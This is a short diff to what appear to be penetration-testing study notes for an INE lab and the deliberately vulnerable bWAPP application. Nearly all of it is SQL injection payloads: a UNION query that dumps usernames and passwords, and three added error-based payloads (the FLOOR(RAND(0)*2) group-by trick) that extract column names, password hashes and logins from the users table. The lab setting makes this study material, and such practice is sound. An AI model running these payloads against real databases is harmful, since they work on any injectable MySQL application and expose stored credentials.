@@ -22,6 +22,14 @@ http://demo.ine.local/sqli_2.php?movie=99 UNION SELECT NULL, @@datadir, @@versio
 ```sql
 select * from users where user_id = 1 union all select 1,(select group_concat(user,0x3a,password) from users),3,4,5,6;
 ' AND (SELECT 1 from(Select count(*), concat("Hello ", version()," - ", FLOOR(RAND(0)*2)) B from information_schema.tables group by B) C) #
+
+' AND (SELECT 1 from(Select count(*), concat("Hello ", (select distinct(column_name) from information_schema.columns where table_schema="bWAPP" and table_name='users' limit 3,1)," - ", FLOOR(RAND(0)*2)) B from information_schema.tables group by B) C) #
+
+' AND (SELECT 1 from (Select count(*), concat("Hello ", (select password from bWAPP.users limit 0,1)," - ", FLOOR(RAND(0)*2)) B from information_schema.tables group by B) C) #
+
+' AND (SELECT 1 from (Select count(*), concat("Hello ", (select login from bWAPP.users limit 1,1)," - ", FLOOR(RAND(0)*2)) B from information_schema.tables group by B) C) #
+
+
 ```
 
 ### Authentication Bypass
